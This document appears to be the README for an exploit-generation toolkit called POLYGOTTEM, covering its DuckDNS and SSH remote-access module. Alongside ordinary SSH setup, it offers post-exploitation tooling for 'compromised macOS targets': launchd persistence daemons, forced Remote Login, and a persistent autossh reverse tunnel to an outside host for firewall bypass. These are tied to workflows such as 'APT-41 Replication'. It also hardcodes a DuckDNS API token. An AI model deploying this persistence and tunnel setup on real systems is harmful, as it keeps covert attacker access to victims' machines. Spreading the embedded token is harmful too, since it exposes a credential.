# Remote Access via DuckDNS

## Overview

POLYGOTTEM now includes **DuckDNS integration** for remote SSH access after exploit generation. This feature automatically registers your public IP with `polygottem.duckdns.org` and sets up SSH access.

## Features

✅ **Automatic IP Registration** - Updates DuckDNS with your current public IP
✅ **SSH Server Setup** - Ensures SSH server is running (Linux + macOS)
✅ **Connection Information** - Provides easy-to-use SSH connection string
✅ **Integrated Workflow** - Offered at the end of all workflows
✅ **Zero Configuration** - Works out-of-the-box
✅ **macOS Persistence** - LaunchDaemons + LaunchAgents for automatic startup
✅ **SSH Keepalive** - Automatic monitoring and restart of SSH service
✅ **Reverse Tunnels** - Bypass NAT/firewalls with autossh

---

## Configuration

### DuckDNS Credentials

The integration uses pre-configured credentials:

```python
Domain: polygottem.duckdns.org
API Token: 62414348-fa36-4a8c-8fc2-8b96ef48b3ea
```

These credentials are hardcoded in `tools/duckdns_integration.py` for convenience.

---

## Usage

### 1. Automatic Prompt (Integrated)

At the end of any workflow, you'll be prompted:

```
═══════════════════════════════════════════════════════════════════
🌐 Remote Access Setup
═══════════════════════════════════════════════════════════════════

ℹ Enable remote SSH access via DuckDNS?
  • Register IP with polygottem.duckdns.org
  • Setup SSH server for remote access
  • Get connection information

Setup remote access? [y/N]:
```

Press **Y** to enable remote access.

### 2. Manual Execution

You can also run the DuckDNS integration manually:

```bash
# Full setup (update DNS + SSH)
python3 tools/duckdns_integration.py --full

# Only update DNS
python3 tools/duckdns_integration.py --update

# Only setup SSH
python3 tools/duckdns_integration.py --setup-ssh

# Show current info
python3 tools/duckdns_integration.py

# macOS: Install full persistence (LaunchDaemons + LaunchAgents)
python3 tools/duckdns_integration.py --install-macos-persistence

# macOS: Install with reverse tunnel
python3 tools/duckdns_integration.py --install-macos-persistence --tunnel-host your-server.com

# Setup reverse tunnel (Linux/macOS)
python3 tools/duckdns_integration.py --reverse-tunnel your-server.com --tunnel-port 2222
```

---

## macOS-Specific Features

### Overview

macOS support includes comprehensive persistence mechanisms and automatic SSH management:

- **Remote Login** - Automatic `systemsetup -setremotelogin on`
- **LaunchDaemons** - System-wide SSH keepalive in `/Library/LaunchDaemons/`
- **LaunchAgents** - User-level DuckDNS updates in `~/Library/LaunchAgents/`
- **Reverse Tunnels** - Persistent autossh tunnels for NAT bypass

### Quick Start (macOS)

**Install complete macOS persistence:**

```bash
python3 tools/duckdns_integration.py --install-macos-persistence
```

This installs:
1. SSH keepalive LaunchDaemon (system-wide)
2. DuckDNS auto-update LaunchAgent (user-level)

**With reverse tunnel:**

```bash
python3 tools/duckdns_integration.py --install-macos-persistence --tunnel-host your-server.com
```

### macOS Components

#### 1. Remote Login Enablement

Automatically enables macOS Remote Login (SSH):

```bash
sudo systemsetup -setremotelogin on
```

- Checks if already enabled
- Requires sudo privileges
- Works on all macOS versions

#### 2. LaunchDaemon (System-Wide)

**Location:** `/Library/LaunchDaemons/com.polygottem.sshkeepalive.plist`

**Features:**
- Runs at boot time (system-wide)
- Monitors SSH service status
- Automatically restarts SSH if stopped
- Logs to `/var/log/com.polygottem.sshkeepalive.log`
- Checks every 60 seconds (throttled)

**Script:** `/usr/local/bin/ssh_keepalive.sh`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "...">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.polygottem.sshkeepalive</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>ThrottleInterval</key>
    <integer>60</integer>
</dict>
</plist>
```

#### 3. LaunchAgent (User-Level)

**Location:** `~/Library/LaunchAgents/com.polygottem.duckdns.plist`

**Features:**
- Runs when user logs in
- Updates DuckDNS every 5 minutes (300 seconds)
- Keeps IP address current
- Logs to `/tmp/com.polygottem.duckdns.log`

**Script:** `~/bin/duckdns_update.sh`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "...">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.polygottem.duckdns</string>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
```

#### 4. Reverse SSH Tunnel

**Location:** `/Library/LaunchDaemons/com.polygottem.reversetunnel.plist`

**Features:**
- Persistent reverse SSH tunnel using autossh
- Bypasses NAT/firewalls
- Automatically reconnects on failure
- Monitors connection health (port 20000)
- Logs to `/var/log/reverse_tunnel.log`

**Script:** `/usr/local/bin/reverse_tunnel.sh`

```bash
autossh -M 20000 -f -N \
    -o "ServerAliveInterval=30" \
    -o "ServerAliveCountMax=3" \
    -R 2222:localhost:22 \
    tunnel@your-server.com
```

### macOS Management Commands

**List installed LaunchDaemons:**
```bash
sudo launchctl list | grep polygottem
```

**List installed LaunchAgents:**
```bash
launchctl list | grep polygottem
```

**Manually load LaunchDaemon:**
```bash
sudo launchctl load -w /Library/LaunchDaemons/com.polygottem.sshkeepalive.plist
```

**Manually unload LaunchDaemon:**
```bash
sudo launchctl unload /Library/LaunchDaemons/com.polygottem.sshkeepalive.plist
```

**Check SSH status:**
```bash
sudo systemsetup -getremotelogin
```

**View keepalive logs:**
```bash
tail -f /var/log/com.polygottem.sshkeepalive.log
```

**View DuckDNS update logs:**
```bash
tail -f /tmp/com.polygottem.duckdns.log
```

### Target Deployment (macOS)

For deploying on compromised macOS targets:

```bash
# Deploy script to target
python3 tools/target_duckdns_setup.py --install-macos-persistence

# With reverse tunnel
python3 tools/target_duckdns_setup.py --install-macos-persistence --tunnel-host your-server.com

# Custom tunnel port
python3 tools/target_duckdns_setup.py --install-macos-persistence --tunnel-host your-server.com --tunnel-port 3333
```

---

## What It Does

### Step 1: Update DuckDNS

```
[1/3] Updating DuckDNS...
✓ DuckDNS updated: polygottem.duckdns.org → 203.0.113.45
```

Registers your current public IP with DuckDNS.

### Step 2: Setup SSH Server

```
[2/3] Setting up SSH server...
✓ SSH server is running on port 22
```

Ensures your SSH server is running and accessible.

### Step 3: Show Connection Info

```
[3/3] SSH Connection Information:
----------------------------------------------------------------------
  Domain:     polygottem.duckdns.org
  Public IP:  203.0.113.45
  Username:   your_username
  Port:       22

  Connection: ssh your_username@polygottem.duckdns.org
  Updated:    2025-11-15 09:30:45
----------------------------------------------------------------------

✓ Setup complete!

To connect remotely:
  ssh your_username@polygottem.duckdns.org

⚠ Make sure your firewall allows SSH connections (port 22)
```

---

## Workflow Integration

Remote access is offered at the end of **all workflows**:

1. ⚡ **Quick Exploit** → Generate exploit → OpSec → **Remote Access?**
2. 🎯 **Smart Polyglot** → Generate polyglot → **Remote Access?**
3. 🚀 **Full Campaign** → Generate chain → **Remote Access?**
4. 🪆 **APT-41 Replication** → Generate APT-41 polyglot → **Remote Access?**
5. 📱 **Platform Attack Chain** → Generate platform exploits → **Remote Access?**
6. 🎨 **Custom Workflow** → Generate custom polyglot → **Remote Access?**
7. 🔬 **CPU Desync Test** → Generate services → **Remote Access?**

---

## Network Requirements

### Firewall Configuration

**To allow remote SSH access, ensure port 22 is open:**

#### macOS (Built-in Firewall)

macOS Remote Login automatically configures the firewall. To manually manage:

```bash
# Check firewall status
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# Enable firewall
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on

# Allow SSH (Remote Login does this automatically)
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/sbin/sshd
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /usr/sbin/sshd
```

#### Linux (UFW)
```bash
sudo ufw allow 22/tcp
sudo ufw enable
```

#### Linux (iptables)
```bash
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables-save > /etc/iptables/rules.v4
```

#### Router Port Forwarding

If behind a router/NAT:
1. Access your router's admin panel
2. Setup port forwarding: External Port 22 → Internal IP:22
3. Save and apply changes

---

## Security Considerations

### SSH Security Best Practices

1. **Use SSH Keys (Recommended)**
   ```bash
   ssh-keygen -t ed25519
   ssh-copy-id user@polygottem.duckdns.org
   ```

2. **Disable Password Authentication**
   ```bash
   # Edit /etc/ssh/sshd_config
   PasswordAuthentication no
   PubkeyAuthentication yes
   ```

3. **Change Default Port (Optional)**
   ```bash
   # Edit /etc/ssh/sshd_config
   Port 2222  # Use non-standard port
   ```

4. **Limit User Access**
   ```bash
   # Edit /etc/ssh/sshd_config
   AllowUsers your_username
   ```

### DuckDNS Token Security

⚠️ **The API token is included in the code for convenience but should be protected:**

- Do not commit changes to public repositories with your personal token
- Consider using environment variables for sensitive deployments:
  ```python
  api_token = os.getenv('DUCKDNS_TOKEN', 'default_token')
  ```

---

## Troubleshooting

### DuckDNS Update Fails

**Symptom:** `✗ DuckDNS update failed`

**Solutions:**
- Check internet connectivity
- Verify DuckDNS API token is correct
- Manually test: `curl "https://www.duckdns.org/update?domains=polygottem&token=YOUR_TOKEN&ip="`

### SSH Server Not Running

**Symptom:** `⚠ Could not start SSH server`

**Solutions:**

**macOS:**
```bash
# Enable Remote Login
sudo systemsetup -setremotelogin on

# Check status
sudo systemsetup -getremotelogin

# Manually restart SSH
sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist
sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist
```

**Linux (Ubuntu/Debian):**
```bash
sudo apt install openssh-server
sudo systemctl start ssh
sudo systemctl enable ssh
```

**Linux (Fedora/RHEL):**
```bash
sudo dnf install openssh-server
sudo systemctl start sshd
sudo systemctl enable sshd
```

### Cannot Connect Remotely

**Symptom:** `ssh: connect to host polygottem.duckdns.org port 22: Connection refused`

**Solutions:**
1. Check firewall: `sudo ufw status`
2. Verify SSH is running: `systemctl status ssh`
3. Check port forwarding on router
4. Test local connection first: `ssh localhost`

### Public IP Detection Failed

**Symptom:** `Failed to detect public IP`

**Solutions:**
- Check internet connectivity
- Manually specify IP:
  ```bash
  python3 tools/duckdns_integration.py --update --ip YOUR_IP
  ```

### macOS LaunchDaemon/LaunchAgent Issues

**Symptom:** LaunchDaemon not running or persistence not working

**Check if loaded:**
```bash
# Check LaunchDaemon (system-wide)
sudo launchctl list | grep polygottem

# Check LaunchAgent (user-level)
launchctl list | grep polygottem
```

**Manual reload:**
```bash
# Unload and reload LaunchDaemon
sudo launchctl unload /Library/LaunchDaemons/com.polygottem.sshkeepalive.plist
sudo launchctl load -w /Library/LaunchDaemons/com.polygottem.sshkeepalive.plist

# Unload and reload LaunchAgent
launchctl unload ~/Library/LaunchAgents/com.polygottem.duckdns.plist
launchctl load -w ~/Library/LaunchAgents/com.polygottem.duckdns.plist
```

**Check logs:**
```bash
# System logs
tail -f /var/log/com.polygottem.sshkeepalive.log

# User logs
tail -f /tmp/com.polygottem.duckdns.log

# Reverse tunnel logs
tail -f /var/log/reverse_tunnel.log
```

**Remove persistence:**
```bash
# Remove LaunchDaemon
sudo launchctl unload /Library/LaunchDaemons/com.polygottem.sshkeepalive.plist
sudo rm /Library/LaunchDaemons/com.polygottem.sshkeepalive.plist
sudo rm /usr/local/bin/ssh_keepalive.sh

# Remove LaunchAgent
launchctl unload ~/Library/LaunchAgents/com.polygottem.duckdns.plist
rm ~/Library/LaunchAgents/com.polygottem.duckdns.plist
rm ~/bin/duckdns_update.sh

# Remove reverse tunnel
sudo launchctl unload /Library/LaunchDaemons/com.polygottem.reversetunnel.plist
sudo rm /Library/LaunchDaemons/com.polygottem.reversetunnel.plist
sudo rm /usr/local/bin/reverse_tunnel.sh
```

### Reverse Tunnel Not Connecting

**Symptom:** autossh tunnel fails to establish

**Solutions:**
```bash
# Check if autossh is installed
which autossh

# macOS: Install autossh
brew install autossh

# Linux: Install autossh
sudo apt install autossh  # Debian/Ubuntu
sudo yum install autossh  # RHEL/CentOS

# Test manual connection
ssh -R 2222:localhost:22 tunnel@your-server.com

# Check if SSH keys are configured
ls -la ~/.ssh/id_*

# Generate SSH keys if needed
ssh-keygen -t ed25519
ssh-copy-id tunnel@your-server.com
```

---

## Advanced Features

### Reverse SSH Tunnel (for NAT/Firewall Bypass)

If you cannot forward ports, use reverse SSH tunneling:

```python
duckdns.setup_autossh_tunnel('remote_server.com', remote_port=2222)
```

**Requirements:**
```bash
sudo apt install autossh
```

**How it works:**
- Your machine connects OUT to a remote server
- Creates reverse tunnel: remote_server:2222 → localhost:22
- Connect via: `ssh -p 2222 localhost` (from remote_server)

---

## API Reference

### DuckDNSIntegration Class

```python
from duckdns_integration import DuckDNSIntegration

# Initialize
duckdns = DuckDNSIntegration(
    domain="polygottem.duckdns.org",
    api_token="62414348-fa36-4a8c-8fc2-8b96ef48b3ea",
    ssh_port=None  # None = random port for security
)

# Update DuckDNS
duckdns.update_duckdns()  # Auto-detect IP
duckdns.update_duckdns(ip="203.0.113.45")  # Specify IP

# Setup SSH
duckdns.setup_ssh_server(port=22)

# Get connection info
info = duckdns.get_ssh_connection_info()
# Returns: {'domain': '...', 'ip': '...', 'username': '...', ...}

# Full setup
duckdns.register_and_connect()

# macOS: Enable Remote Login
duckdns.enable_macos_remote_login()

# macOS: Install complete persistence
duckdns.install_macos_persistence(remote_host='your-server.com')

# Generate LaunchDaemon plist
plist = duckdns.generate_launchdaemon_plist('/usr/local/bin/script.sh')

# Generate LaunchAgent plist
plist = duckdns.generate_launchagent_plist('~/bin/script.sh')

# Generate keepalive script
script = duckdns.generate_ssh_keepalive_script()

# Generate reverse tunnel script
script = duckdns.generate_reverse_tunnel_script('server.com', 2222)

# Reverse tunnel (Linux/macOS)
duckdns.setup_autossh_tunnel('remote.server.com', remote_port=2222)
```

---

## Example Session

```bash
$ ./launch.sh interactive
...
[Workflow completes]

═══════════════════════════════════════════════════════════════════
🌐 Remote Access Setup
═══════════════════════════════════════════════════════════════════

ℹ Enable remote SSH access via DuckDNS?
  • Register IP with polygottem.duckdns.org
  • Setup SSH server for remote access
  • Get connection information

Setup remote access? [y/N]: y

======================================================================
DuckDNS Registration & SSH Setup
======================================================================

[1/3] Updating DuckDNS...
✓ DuckDNS updated: polygottem.duckdns.org → 203.0.113.45

[2/3] Setting up SSH server...
✓ SSH server is running on port 22

[3/3] SSH Connection Information:
----------------------------------------------------------------------
  Domain:     polygottem.duckdns.org
  Public IP:  203.0.113.45
  Username:   researcher
  Port:       22

  Connection: ssh researcher@polygottem.duckdns.org
  Updated:    2025-11-15 09:30:45
----------------------------------------------------------------------

✓ Setup complete!

To connect remotely:
  ssh researcher@polygottem.duckdns.org

⚠ Make sure your firewall allows SSH connections (port 22)


─── Operation Summary ───────────────────────────────────────────────
...
```

---

## Integration Points

### In PolyglotOrchestrator

The DuckDNS feature is integrated in:

```python
# tools/polyglot_orchestrator.py

class PolyglotOrchestrator:
    def __init__(self, verbose=True):
        ...
        self.duckdns = DuckDNSIntegration()

    def run_interactive(self):
        # ... run workflow ...

        # Offer remote access
        self._offer_duckdns_registration()

        # Show summary
        self._show_operation_summary()
```

All 7 workflows automatically include the remote access option.

---

## Summary of macOS Enhancements

This update adds comprehensive macOS support:

✅ **Remote Login** - Automatic `sudo systemsetup -setremotelogin on`
✅ **LaunchDaemons** - System-wide SSH keepalive in `/Library/LaunchDaemons/`
✅ **LaunchAgents** - User-level DuckDNS updates in `~/Library/LaunchAgents/`
✅ **SSH Keepalive** - Monitors and restarts SSH every 60 seconds
✅ **Reverse Tunnels** - Persistent autossh tunnels with automatic reconnection
✅ **Target Deployment** - Post-exploitation script supports macOS persistence

**Key Features:**
- Automatic platform detection (macOS vs Linux)
- Full launchd integration for persistence
- Reverse SSH tunnels for NAT/firewall bypass
- Comprehensive logging and monitoring
- Easy installation with single command

**Quick Start:**
```bash
# macOS: Install everything
python3 tools/duckdns_integration.py --install-macos-persistence --tunnel-host your-server.com

# Target deployment
python3 tools/target_duckdns_setup.py --install-macos-persistence
```

---

**Last Updated:** 2025-11-15
**Version:** 2.1.0 - macOS Persistence Update
